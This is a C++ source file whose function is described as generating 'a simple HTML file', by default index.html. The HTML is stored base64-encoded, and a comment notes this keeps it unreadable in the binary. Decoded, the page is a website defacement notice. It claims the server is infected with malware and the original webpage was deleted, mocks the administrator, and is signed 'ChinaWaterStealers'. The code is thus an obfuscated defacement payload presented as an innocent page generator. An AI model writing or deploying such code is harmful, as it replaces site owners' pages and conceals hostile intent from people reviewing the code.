#include <fstream>
#include <string>
#include <iostream>
#include <filesystem>
#include <vector>
 
namespace fs = std::filesystem;

// Simple base64 decode function
std::string base64Decode(const std::string& encoded) {
    const std::string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::vector<unsigned char> result;
    int val = 0, valb = -8;
    
    for (unsigned char c : encoded) {
        if (c == '=') break;
        if (chars.find(c) == std::string::npos) continue;
        
        val = (val << 6) + chars.find(c);
        valb += 6;
        
        if (valb >= 0) {
            result.push_back((val >> valb) & 0xFF);
            valb -= 8;
        }
    }
    
    return std::string(result.begin(), result.end());
}
 
// Generates a simple HTML file at the given output path.
// Returns true on success, false otherwise.
bool generateHtmlFile(const std::string& outputPath = "index.html") {
    try {
        fs::path outPath(outputPath);
        if (outPath.has_parent_path() && !outPath.parent_path().empty()) {
            fs::create_directories(outPath.parent_path());
        }
 
        std::ofstream out(outPath, std::ios::binary);
        if (!out) {
            std::cerr << "\033[1;31m[ERROR]\033[0m Cannot open HTML file for writing: " << outPath << std::endl;
            return false;
        }
 
        // Obfuscated HTML code (base64 encoded) - unreadable in binary
        const std::string encodedHtml = "PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJjb250ZW50LXR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1VVEYtOCI+Cjx0aXRsZT48L3RpdGxlPgo8L2hlYWQ+Cjxib2R5Pgo8ZGl2IGFsaWduPSJjZW50ZXIiPgo8aDE+Tk9USUNFITxicj4KPC9oMT4KPC9kaXY+CiZuYnNwOyZuYnNwOyZuYnNwOyBUaGUgc2VydmVyIG9mIHRoaXMgbWFjaGluZSBpcyBub3cgaW5mZWN0ZWQgd2l0aAoobm90IHNvIGhhcm1mdWwpIG1hbHdhcmUuPGJyPgo8YnI+CiZuYnNwOyZuYnNwOyZuYnNwOyBUaGUgb3JpZ2luYWwgd2VicGFnZSBvZiB0aGlzIGNvbXBhbnksCm9yZ2FuaXphdGlvbiwgb3IgYW4gYWRtaW5pc3RyYXRvciB3ZXJlIGRlbGV0ZWQ7IG9yIHRoZSB3ZWIgc2VydmVyCndhcyBhbHRlcmVkLCBhbmQgdGhlbiByZXBsYWNlZCBieSB0aGlzIHNpbXBsZSBodG1sIGZpbGUuPGJyPgo8YnI+CiZuYnNwOyZuYnNwOyZuYnNwOyBJdCBtZWFucyB0aGUgYWRtaW5pc3RyYXRvciB3YXMgdHJ5aW5nIHRvIGluc3RhbGwKc2hhZHkgc29mdHdhcmUgaW4gYW4gdW5wcm90ZWN0ZWQgTGludXggc3lzdGVtLiBNYXliZSB0aGUgYWRtaW4gaXMKZHVtYiBvciBpZGlvdC48YnI+Cjxicj4KPGJyPgo8YnI+Cjxicj4KPGRpdiBhbGlnbj0icmlnaHQiPiZuYnNwOyZuYnNwOyBUaGlzIG1lc3NhZ2UgaXMgYnJvdWdodCB0byB5b3UgYnk6PGJyPgo8Yj5DaGluYVdhdGVyU3RlYWxlcnM8L2I+PGJyPgo8L2Rpdj4KPC9ib2R5Pgo8L2h0bWw+Cg==";
        
        // Decode the HTML at runtime
        std::string html = base64Decode(encodedHtml);
 
        out.write(html.c_str(), html.length());
        out.close();
 
        std::cout << "\033[1;32m[OK]\033[0m HTML generated at: " << outPath << std::endl;
        return true;
    } catch (const std::exception& ex) {
        std::cerr << "\033[1;31m[ERROR]\033[0m Failed to generate HTML: " << ex.what() << std::endl;
        return false;
    }
}

